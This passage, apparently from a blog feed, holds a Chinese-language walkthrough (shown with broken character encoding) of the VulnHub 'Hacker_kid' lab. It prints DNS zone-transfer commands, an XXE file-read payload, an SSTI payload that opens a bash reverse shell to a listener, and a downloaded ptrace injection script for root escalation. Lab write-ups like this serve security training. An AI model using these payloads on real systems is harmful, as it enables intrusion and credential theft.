&lt;/blockquote&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>VulnHub-7-Hacker_kid</title>
    <link href="http://example.com/2022/04/12/week7/"/>
    <id>http://example.com/2022/04/12/week7/</id>
    <published>2022-04-12T07:08:45.030Z</published>
    <updated>2022-04-12T07:11:24.716Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>é¶æœºï¼š<a href="https://download.vulnhub.com/hackerkid/Hacker_Kid-v1.0.1.ova">https://download.vulnhub.com/hackerkid/Hacker_Kid-v1.0.1.ova</a><br>  éš¾åº¦ï¼šä¸­<br>  ç›®æ ‡ï¼šå–å¾—rootæƒé™</p></blockquote><span id="more"></span><h2 id="ä¸€ã€ä¿¡æ¯æ”¶é›†"><a href="#ä¸€ã€ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¸€ã€ä¿¡æ¯æ”¶é›†"></a>ä¸€ã€ä¿¡æ¯æ”¶é›†</h2><h3 id="1-ä¸»æœºå‘ç°"><a href="#1-ä¸»æœºå‘ç°" class="headerlink" title="1.ä¸»æœºå‘ç°"></a>1.ä¸»æœºå‘ç°</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig #æŸ¥çœ‹æœ¬æœºkaliçš„IPåœ°å€ 192.168.137.22</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master/seven/image-20211230104424569.png" alt="image-20211230104424569"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo arp-scan -l</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master/seven/image-20211230104521562.png" alt="image-20211230104521562"></p><p>å‘ç°ç›®æ ‡ä¸»æœº192.168.137.244</p><h3 id="2-ç«¯å£æ‰«æ"><a href="#2-ç«¯å£æ‰«æ" class="headerlink" title="2.ç«¯å£æ‰«æ"></a>2.ç«¯å£æ‰«æ</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -p- 192.168.137.244 #æ‰«æç›®æ ‡å¼€æ”¾çš„ç«¯å£</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master/seven/image-20211230104655243.png" alt="image-20211230104655243"></p><h3 id="3-æœåŠ¡æ¢æµ‹"><a href="#3-æœåŠ¡æ¢æµ‹" class="headerlink" title="3.æœåŠ¡æ¢æµ‹"></a>3.æœåŠ¡æ¢æµ‹</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -p- -sV 192.168.137.244 #æ‰«æç«¯å£æœåŠ¡ä¿¡æ¯</span><br></pre></td></tr></table></figure><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211230104738596.png" alt="image-20211230104738596">ä»æ‰«æç»“æœæ¥çœ‹ï¼Œ</p><p>53ç«¯å£ domainåŸŸåæœåŠ¡ï¼ˆDNSï¼‰</p><p>80ç«¯å£ Apache webæœåŠ¡</p><p>9999ç«¯å£ Tornado(åŸºäºPythonçš„è½»é‡Webæ¡†æ¶)</p><p>53ç«¯å£æ˜¯DNSåŸŸåè§£æä½¿ç”¨çš„åŸŸåæœåŠ¡ï¼Œé€šå¸¸ä¼šä½¿ç”¨tcpå’Œudpï¼š</p><p>tcpçš„53ç«¯å£ä¸€èˆ¬ç”¨äºåŒåŸŸå†…ä¸¤å°åŸŸåæœåŠ¡å™¨ä¹‹é—´çš„æ•°æ®åŒæ­¥ã€äº¤æ¢</p><p>udpçš„53ç«¯å£ä¸€èˆ¬ç”¨äºå®¢æˆ·ç«¯å‘DNSæœåŠ¡å™¨æŸ¥è¯¢åŸŸå</p><p>ç”±äº<strong>nmapé»˜è®¤åªæ‰«ætcpç«¯å£</strong>ï¼Œæ‰€ä»¥ä½¿ç”¨-sUå‚æ•°æ‰«æéªŒè¯udpç«¯å£53</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -p53 -sU -sV 10.0.2.15</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master/seven/image-20211230104932514.png" alt="image-20211230104932514"></p><p>ç¡®å®å¼€æ”¾äº†udp53ç«¯å£</p><p>ä¸€å°DNSæœåŠ¡å™¨ä¸Šå¯èƒ½åŒ…å«å¤šä¸ªDNSåŒºåŸŸ</p><p>å°è¯•å¯¹ISC BIND 9.16.1æœç´¢ï¼Œå‘ç°æœ‰è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆCVE-20208625ï¼ŒCVE-202125216ï¼‰ï¼Œä½†æœªæ‰¾åˆ°exp</p><h2 id="äºŒã€æ¼æ´å‘ç°"><a href="#äºŒã€æ¼æ´å‘ç°" class="headerlink" title="äºŒã€æ¼æ´å‘ç°"></a>äºŒã€æ¼æ´å‘ç°</h2><h3 id="1-è®¿é—®80ç«¯å£"><a href="#1-è®¿é—®80ç«¯å£" class="headerlink" title="1.è®¿é—®80ç«¯å£"></a>1.è®¿é—®80ç«¯å£</h3><p><img src="https://gitee.com/byesec/picture/raw/master/seven/image-20211230105728056.png" alt="image-20211230105728056"></p><p>æ ¹æ®é¡µé¢ä¿¡æ¯ åƒæ˜¯ä¸€åå°é»‘å®¢çš„ç•™è¨€..</p><p>å‘ç°â€More you will DIG me,more you will find me on your servers..DIG me moreâ€¦DIG me moreâ€ è¿™å¥è¯</p><p>è”æƒ³åˆ°Linuxä¸‹çš„DNSç®¡ç†ä¸­ å­˜åœ¨DIGå‘½ä»¤ </p><p>åˆ†åˆ«å†å¯¹Start App Formä¸‰ä¸ªé“¾æ¥è¿›è¡Œç‚¹å‡» </p><p>Startï¼š</p><p>åœ¨è®¿é—®Starté¡µé¢æ—¶çš„URLä¸ºï¼š<a href="http://192.168.137.244/index.html">http://192.168.137.244/index.html</a></p><p>å°è¯•å°†index.html æ›´æ”¹åç¼€ä¸º index.php</p><p><img src="https://gitee.com/byesec/picture/raw/master/seven/image-20211230110654234.png" alt="image-20211230110654234"></p><p>å‘ç°é¡µé¢æ­£å¸¸è§£æä¸ºç›¸åŒçš„ä¸»é¡µâ€“è¯´æ˜ç›®æ ‡åº”è¯¥æ˜¯ç”¨çš„PHPè¯­è¨€å¼€å‘ç¯å¢ƒ</p><p>Appï¼š</p><p>åœ¨è®¿é—®Starté¡µé¢æ—¶çš„URLä¸ºï¼š<a href="http://192.168.137.244/index.php#app.html">http://192.168.137.244/index.php#app.html</a></p><p>å°è¯•è®¿é—®ï¼š<a href="http://192.168.137.244/app.html">http://192.168.137.244/app.html</a></p><p><img src="https://gitee.com/byesec/picture/raw/master/seven/image-20211230111419115.png" alt="image-20211230111419115"></p><p>å‘ç°ä¸€ä¸ªç±»ä¼¼äºåº”ç”¨ç¤ºä¾‹çš„ç•Œé¢ï¼Œç»è¿‡å¯¹é¡µé¢çš„å°è¯•åï¼Œä¹Ÿæœªå‘ç°ç›´æ¥å¯åˆ©ç”¨ç‚¹ã€‚</p><p>Appï¼š</p><p>åœ¨è®¿é—®Starté¡µé¢æ—¶çš„URLä¸ºï¼š<a href="http://192.168.137.244/index.php#form.html">http://192.168.137.244/index.php#form.html</a></p><p>å°è¯•è®¿é—®ï¼š<a href="http://192.168.137.244/form.html">http://192.168.137.244/form.html</a></p><p><img src="https://gitee.com/byesec/picture/raw/master/seven/image-20211230111727097.png" alt="image-20211230111727097"></p><p>ä»æœªå‘ç°å¯ç›´æ¥åˆ©ç”¨çš„çªç ´ç‚¹ã€‚</p><p>å°†æ€è·¯è½¬å›åˆ°é¦–é¡µé¡µé¢çš„æç¤ºä¿¡æ¯â€“DIG</p><p>ä½†è‹¥æƒ³åˆ©ç”¨DIGå‘½ä»¤ å°±å¿…é¡»çŸ¥é“ç›¸å…³çš„åŸŸåä¿¡æ¯</p><p>æŸ¥çœ‹æºç ï¼Œåœ¨æ³¨é‡Šå†…å‘ç°äº†ä¿¡æ¯</p><p><img src="https://gitee.com/byesec/picture/raw/master/seven/image-20211230112257460.png" alt="image-20211230112257460"></p><p>åœ¨URLå†…æ„é€ </p><p><a href="http://192.168.137.244/?page_no=2">http://192.168.137.244?page_no=2</a></p><p>å¹¶æ‰“å¼€Burpsuiteé…ç½®ï¼Œè¿›è¡Œæˆªå–ï¼Œå‘é€è‡³Intruder</p><p><img src="https://gitee.com/byesec/picture/raw/master/seven/image-20211230112700774.png" alt="image-20211230112700774"></p><p>å¯¹page_no&#x3D;x å¤„å°è¯•çˆ†ç ´</p><p><img src="https://gitee.com/byesec/picture/raw/master/seven/image-20211230112831248.png" alt="image-20211230112831248"></p><p>é€‰æ‹©æ•°å­—å­—å…¸</p><p><img src="https://gitee.com/byesec/picture/raw/master/seven/image-20211230113028498.png" alt="image-20211230113028498"></p><p><img src="https://gitee.com/byesec/picture/raw/master/seven/image-20211230113236472.png" alt="image-20211230113236472"></p><p>ç»“æœæ˜¾ç¤º ä¼¼ä¹å½“page_no&#x3D;21æ—¶ï¼Œé¡µé¢ä¼šæœ‰ä¸åŒçš„å“åº”</p><p>è®¿é—®<a href="http://192.168.137.244/?page_no=21">http://192.168.137.244/?page_no=21</a></p><p><img src="https://gitee.com/byesec/picture/raw/master/seven/image-20211230113507952.png" alt="image-20211230113507952"></p><p>é¡µé¢ä¸‹æ–¹çš„ä¿¡æ¯æç¤ºï¼šè¯¥å°é»‘å®¢ä¸ºäº†æ–¹ä¾¿è‡ªå·±å¯ä»¥éšæ—¶è¿æ¥è¯¥æœåŠ¡å™¨ï¼Œåˆ›å»ºäº†ä¸€ä¸ªå­åŸŸï¼Œå…¶ä¸­ä¸€ä¸ªåä¸ºhackers.blackhat.local</p><h3 id="2-DNSåŒºåŸŸä¼ è¾“"><a href="#2-DNSåŒºåŸŸä¼ è¾“" class="headerlink" title="2.DNSåŒºåŸŸä¼ è¾“"></a>2.DNSåŒºåŸŸä¼ è¾“</h3><p>ç»‘å®šhosts</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vi /etc/hosts</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master/seven/image-20211230114008595.png" alt="image-20211230114008595"></p><p>ç»‘å®šå®Œæˆåè®¿é—®hackers.blackhat.localå‘ç°å’Œç›´æ¥ç”¨IPè®¿é—®æ²¡æœ‰ä»€ä¹ˆåŒºåˆ«</p><p><img src="https://gitee.com/byesec/picture/raw/master/seven/image-20211230114342113.png" alt="image-20211230114342113"></p><p>hackers.blackhat.localåªæ˜¯åœ¨blackhat.local DNSåŒºåŸŸå†…çš„ä¸€æ¡ä¸»æœºè®°å½•ï¼Œé‚£æ˜¯å¦æœ‰æ›´å¤šçš„ä¸»æœºè®°å½•</p><p>æ‰€ä»¥å°è¯•ç»‘å®šä¸€ä¸‹hosts</p><p><img src="https://gitee.com/byesec/picture/raw/master/seven/image-20211230114703747.png" alt="image-20211230114703747"></p><p>ç»“åˆDIG å°è¯•å¯¹é¡µé¢è¿›è¡ŒåŒºåŸŸä¼ è¾“</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dig axfr @192.168.137.244 blackhat.local</span><br></pre></td></tr></table></figure><blockquote><p><code>axfr</code>å‘èµ·axfrè¯·æ±‚</p><p>axfrè¯·æ±‚å¸¸ç”¨äºä¸»ã€ä»dnsæœåŠ¡å™¨ä¹‹é—´åŒæ­¥æ•°æ®.å‘é€axfrè¯·æ±‚å,ä¸»dnsä¼šæŠŠæŒ‡å®šåŒºåŸŸ(é¡¶çº§åŸŸ)ä¸‹çš„æ‰€æœ‰è§£æè®°å½•è¿”å›.</p><p>ä¸€èˆ¬æ¥è¯´,axfrè¯·æ±‚åº”ä»…é™äºä¸»ã€å¤‡dnsæœåŠ¡å™¨ä¹‹é—´,ä½†æ˜¯ç”±äºé”™è¯¯çš„é…ç½®å¯¼è‡´ä»»ä½•äººéƒ½å¯ä»¥è·å¾—æŒ‡å®šåŒºåŸŸä¸‹çš„æ‰€æœ‰è§£æè®°å½•.è¿™ç§æ¼æ´å«åš<strong>DNSåŒºåŸŸä¼ è¾“æ¼æ´</strong></p><p><code>@192.168.137.244</code>ç”¨äºæŒ‡å®šdnsæœåŠ¡å™¨</p><p><code>blackhat.local</code>ä¸ºé¡¶çº§åŸŸå,ä¹Ÿå°±æ˜¯<strong>æŒ‡å®šåŒºåŸŸ</strong></p><p>â€‹                                                                                                  â€“by qiao</p></blockquote><p><img src="https://gitee.com/byesec/picture/raw/master/seven/image-20211230115910294.png" alt="image-20211230115910294"></p><p>é¡µé¢è¿”å›äº†ç›®æ ‡DNSæœåŠ¡å™¨çš„æ‰€æœ‰è§£æè®°å½•ï¼Œè¯´æ˜å­˜åœ¨DNSåŒºåŸŸä¼ è¾“æ¼æ´</p><p>å°†è®°å½•ä¸­ä¸€äº›ç‰¹åˆ«çš„è§£æåŸŸåç»‘å®šæ·»åŠ åˆ°hostså†…</p><p><img src="https://gitee.com/byesec/picture/raw/master/seven/image-20211230120322543.png" alt="image-20211230120322543"></p><p>é€ä¸€è®¿é—®å</p><p>å‘ç°hackerkid.blackhat.local å†…æœ‰ç±»ä¼¼æ³¨å†Œçš„é¡µé¢</p><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211230120519667.png" alt="image-20211230120519667"></p><h3 id="3-XXEæ³¨å…¥"><a href="#3-XXEæ³¨å…¥" class="headerlink" title="3.XXEæ³¨å…¥"></a>3.XXEæ³¨å…¥</h3><p>å°è¯•å¯¹è¯¥é¡µé¢æäº¤æ•°æ® å¹¶æŠ“å–åŒ… å°†å…¶å‘é€åˆ°Repeateré¡µé¢</p><p><img src="https://gitee.com/byesec/picture/raw/master/seven/image-20211230121207620.png" alt="image-20211230121207620"></p><p>å‘ç°è¯¥é¡µé¢æ˜¯ä¸€ä¸ªxmlæ–‡ä»¶ï¼Œä¸”æäº¤ä¼šè¿”å›å­˜åœ¨emailæ ‡ç­¾å†…çš„å†…å®¹ï¼ŒçŒœæµ‹emailæ ‡ç­¾å†…ä¸ºå›æ˜¾ä½ï¼Œç›®æ ‡å¯èƒ½å­˜åœ¨XXEæ¼æ´</p><p>ç»“åˆXXEæ¼æ´ï¼Œå°è¯•è¯»å–&#x2F;etc&#x2F;passwdæ–‡ä»¶</p><p><img src="https://gitee.com/byesec/picture/raw/master/seven/image-20211230121911283.png" alt="image-20211230121911283"></p><p>åœ¨è¯»å–åˆ°çš„ä¿¡æ¯ä¸­å‘ç°saketç”¨æˆ·ä¸ºå¯ç™»å½•è´¦å·</p><p><img src="https://gitee.com/byesec/picture/raw/master/seven/image-20211230122433994.png" alt="image-20211230122433994"></p><p>å°è¯•è¯»å–&#x2F;home&#x2F;saket&#x2F;.bashrc    (&#x2F;bin&#x2F;bashçš„é…ç½®æ–‡ä»¶)</p><p>ä½¿ç”¨phpå°è£…å™¨&#x2F;ä¼ªåè®®ç»“åˆBase64ç¼–ç è¯»å–ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/convert.base64-encode/resource=/home/saket/.bashrc</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master/seven/image-20211230143019938.png" alt="image-20211230143019938"></p><p><img src="https://gitee.com/byesec/picture/raw/master/seven/image-20211230143225434.png" alt="image-20211230143225434"></p><p>è§£ç åæˆåŠŸè¯»å–åˆ°ç”¨æˆ·åadminå’Œå¯†ç Saket!#$%@!!</p><p>ä½†æ˜¯å›å¿†ä¹‹å‰çš„è¯¸å¤šé¡µé¢ä¸­å¥½åƒå¹¶ä¸å­˜åœ¨ç™»å½•é¡µé¢</p><p>ä»”ç»†æƒ³æƒ³ 9999ç«¯å£è¿˜æ²¡æœ‰æŸ¥çœ‹è¿‡</p><h3 id="4-è®¿é—®9999ç«¯å£"><a href="#4-è®¿é—®9999ç«¯å£" class="headerlink" title="4.è®¿é—®9999ç«¯å£"></a>4.è®¿é—®9999ç«¯å£</h3><p><img src="https://gitee.com/byesec/picture/raw/master/seven/image-20211230120716304.png" alt="image-20211230120716304"></p><p>åˆæƒŠåˆå–œ æ˜¯ä¸€ä¸ªç™»å½•é¡µé¢ å°†åˆšæ‰å¾—åˆ°çš„è´¦å·å¯†ç è¾“å…¥</p><p><img src="https://gitee.com/byesec/picture/raw/master/seven/image-20211230143542613.png" alt="image-20211230143542613"></p><p>ç»“æœæ˜¾ç¤ºæŠ¥é”™</p><p>å°è¯•ä½¿ç”¨saketä½œä¸ºç”¨æˆ·å å¯†ç ä¸å˜</p><p><img src="https://gitee.com/byesec/picture/raw/master/seven/image-20211230143658858.png" alt="image-20211230143658858"></p><p>ç™»é™†æˆåŠŸï¼é¡µé¢æç¤ºéœ€è¦çŸ¥é“æˆ‘çš„åå­— é‚£ä¹ˆå¦‚ä½•æ‰èƒ½è®©ä»–çŸ¥é“æˆ‘çš„åå­—å‘¢ï¼Ÿ å°è¯•nameå‚æ•°æäº¤åå­—ï¼ï¼ï¼</p><p><img src="https://gitee.com/byesec/picture/raw/master/seven/image-20211230143925201.png" alt="image-20211230143925201"></p><p>å°è¯•å‡ æ¬¡åï¼Œå‘ç°å…¶æ ¼å¼ä¸ºâ€œHello è¾“å…¥å†…å®¹â€ï¼Œæ€€ç–‘æ˜¯å¦å¯èƒ½æ˜¯æ¨¡ç‰ˆæ³¨å…¥å‘¢ï¼Ÿ</p><h3 id="5-SSTIæ¨¡æ¿æ³¨å…¥"><a href="#5-SSTIæ¨¡æ¿æ³¨å…¥" class="headerlink" title="5.SSTIæ¨¡æ¿æ³¨å…¥"></a>5.SSTIæ¨¡æ¿æ³¨å…¥</h3><p>æ„é€ payloadåšæµ‹è¯•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;1+abcxyz&#125;&#125;$&#123;1+abcxyz&#125;&lt;%1+abcxyz%&gt;[abcxyz]       #abcxyzå¤„æ„ä¸º æ— è§„åˆ™çš„ã€ä¸åº”è¢«å¼€å‘è€…æå‰å®šä¹‰çš„å‡½æ•°å</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master/seven/image-20211230175025746.png" alt="image-20211230175025746"></p><p>å› ä¸èƒ½è¿è¡Œè§£æabcxyzï¼Œé¡µé¢è¿”å›äº†æŠ¥é”™ä¿¡æ¯ï¼Œå¯çŸ¥å…¶ä¸ºpython3.8çš„è¯­è¨€ç¯å¢ƒ</p><p>å†æ¬¡æ„é€ payloadæµ‹è¯•æ˜¯å¦å¯ä»¥æ‰§è¡Œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;7*7&#125;&#123;&#123;7*7&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master/seven/image-20211230175324680.png" alt="image-20211230175324680"></p><p>é¡µé¢è¿”å›äº†æ‰§è¡Œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#125;&#125;</span><br></pre></td></tr></table></figure><p>å†…çš„è¯­å¥ä¿¡æ¯</p><p>æ„é€ æ”»å‡»åå¼¹shellçš„payload:</p><p>kaliï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nvlp 4444</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% import os %&#125;&#123;&#123;os.system(&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/192.168.137.22/4444 0&gt;&amp;1&quot;&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master/seven/image-20211230180135061.png" alt="image-20211230180135061"></p><p>ç»“æœæ˜¾ç¤ºæŠ¥é”™ï¼Œå¹¶æ²¡æœ‰åå¼¹shell</p><p>å°è¯•å°†å…¶è¿›è¡ŒURLç¼–ç å†æ‰§è¡Œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%7B%25%20import%20os%20%25%7D%7B%7Bos.system(&#x27;bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.137.22%2F4444%200%3E%261%22&#x27;)%7D%7D</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master/seven/image-20211230180841637.png" alt="image-20211230180841637"></p><p>æˆåŠŸåå¼¹shell</p><h2 id="ä¸‰ã€ææƒ"><a href="#ä¸‰ã€ææƒ" class="headerlink" title="ä¸‰ã€ææƒ"></a>ä¸‰ã€ææƒ</h2><p>å½“å‰ç”¨æˆ·åªä¸ºæ™®é€šç”¨æˆ·ï¼Œéœ€ææƒè‡³root</p><h3 id="1-å¸¸è§„ææƒ"><a href="#1-å¸¸è§„ææƒ" class="headerlink" title="1.å¸¸è§„ææƒ"></a>1.å¸¸è§„ææƒ</h3><p>å°è¯•uname -a,sudo -l,suidä¸‰ç§æ–¹æ³•éƒ½æ²¡èƒ½æˆåŠŸææƒ</p><h3 id="2-ä½¿ç”¨Capabilitiesææƒ"><a href="#2-ä½¿ç”¨Capabilitiesææƒ" class="headerlink" title="2.ä½¿ç”¨Capabilitiesææƒ"></a>2.ä½¿ç”¨Capabilitiesææƒ</h3><p>å°è¯•ä½¿ç”¨Capabilitiesè¿›è¡Œææƒ</p><p>Capabilitiesç§‘æ™®ï¼š</p><blockquote><p>capabilities æ˜¯linux2.2åå‡ºç°çš„äº§ç‰©ï¼Œå®ƒçš„å‡ºç°ä¸€å®šç¨‹åº¦ä¸Šå¼¥è¡¥äº†suidè¿™ç§ç²—ç³™çš„æƒé™ç®¡ç†æœºåˆ¶ï¼Œä½†æ˜¯capabilities è‡ªèº«ä¹Ÿæœ‰é€ æˆææƒçš„å®‰å…¨éšæ‚£</p></blockquote><p>æ„é€ è¯­å¥ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getcap -r /     #é€’å½’æŸ¥è¯¢æ ¹ç›®å½•ä¸‹è®¾ç½®äº†capabilitiesçš„å¯æ‰§è¡Œæ–‡ä»¶</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master/seven/image-20211230182733872.png" alt="image-20211230182733872"></p><p>ç›®æ ‡ç³»ç»Ÿçš„ç¯å¢ƒå˜é‡æœªè®¾ç½®getcap</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/sbin/getcap -r / 2&gt;/dev/null     #è¿‡æ»¤é”™è¯¯ä¿¡æ¯</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master/seven/image-20211230183234783.png" alt="image-20211230183234783"></p><p>ä»æŸ¥è¯¢åˆ°çš„ä¿¡æ¯ä¸­è¿›è¡Œç­›é€‰ï¼Œç»å¤§å¤šæ•°å¤§å¤šæ˜¯å¯¹ç½‘ç»œæ•°æ®åŒ…çš„æŸ¥çœ‹ï¼Œå¯¹ææƒæ²¡æœ‰å¸®åŠ©ã€‚</p><p>ä½†å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œé’ˆå¯¹python2.7è®¾ç½®äº†cap_sys_ptrace+ep</p><blockquote><p>ptraceæ˜¯ä¸€ä¸ªç³»ç»Ÿè°ƒç”¨ï¼Œå®ƒæä¾›äº†ä¸€ç§æ–¹æ³•æ¥è®©â€˜çˆ¶â€™è¿›ç¨‹å¯ä»¥è§‚å¯Ÿå’Œæ§åˆ¶å…¶å®ƒè¿›ç¨‹çš„æ‰§è¡Œï¼Œæ£€æŸ¥å’Œæ”¹å˜å…¶æ ¸å¿ƒæ˜ åƒä»¥åŠå¯„å­˜å™¨ã€‚ ä¸»è¦ç”¨æ¥å®ç°æ–­ç‚¹è°ƒè¯•å’Œç³»ç»Ÿè°ƒç”¨è·Ÿè¸ªã€‚</p><p>ptraceä¼šåœ¨ä»€ä¹ˆæ—¶å€™å‡ºç°å‘¢ï¼Ÿåœ¨æ‰§è¡Œç³»ç»Ÿè°ƒç”¨ä¹‹å‰ï¼Œå†…æ ¸ä¼šå…ˆæ£€æŸ¥å½“å‰è¿›ç¨‹æ˜¯å¦å¤„äºè¢«â€œè·Ÿè¸ªâ€(traced)çš„çŠ¶æ€ã€‚å¦‚æœæ˜¯çš„è¯ï¼Œå†…æ ¸æš‚åœå½“å‰è¿›ç¨‹å¹¶å°†æ§åˆ¶æƒäº¤ç»™è·Ÿè¸ªè¿›ç¨‹ï¼Œä½¿è·Ÿè¸ªè¿›ç¨‹å¾—ä»¥å¯Ÿçœ‹æˆ–è€…ä¿®æ”¹è¢«è·Ÿè¸ªè¿›ç¨‹çš„å¯„å­˜å™¨ã€‚</p><p>åˆ©ç”¨ptraceå¯ä»¥</p><ol><li>åŠ«æŒå¦ä¸€ä¸ªè¿›ç¨‹çš„ç³»ç»Ÿè°ƒç”¨ï¼Œä¿®æ”¹ä¼ å…¥å‚æ•°ï¼Œè¿”å›å€¼</li><li>å‘å¦ä¸€ä¸ªè¿›ç¨‹æ³¨å…¥ä»£ç ï¼Œè·å¾—ä¸€ä¸ªè¿›ç¨‹çš„eip,espåï¼Œå»ºç«‹è‡ªå·±çš„æ ˆç©ºé—´ï¼Œå¹¶ä½¿eipæŒ‡å‘è‡ªå·±çš„ä»£ç </li></ol><p><a href="https://onestraw.github.io/linux/ptrace-hack/">https://onestraw.github.io/linux/ptrace-hack/</a></p></blockquote><p>æ•…å¯ä»¥å°è¯•åˆ©ç”¨ptraceææƒ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps -U root æˆ– ps -aef | grep   #æŸ¥çœ‹ä»¥rootæƒé™è¿è¡Œçš„è¿›ç¨‹ä¿¡æ¯</span><br></pre></td></tr></table></figure><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211230185641921.png" alt="image-20211230185641921">ä¸‹è½½ä½¿ç”¨æ³¨å…¥è„šæœ¬</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp    </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://gist.githubusercontent.com/wifisecguy/1d69839fe855c36a1dbecca66948ad56/raw/e919439010bbabed769d86303ff18ffbacdaecfd/inject.py</span><br></pre></td></tr></table></figure><blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line">&gt;# The C program provided at the GitHub Link given below can be used as a reference for writing the python script.</span><br><span class="line">&gt;# GitHub Link: https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c </span><br><span class="line"></span><br><span class="line">&gt;import ctypes</span><br><span class="line">&gt;import sys</span><br><span class="line">&gt;import struct</span><br><span class="line"></span><br><span class="line">&gt;# Macros defined in 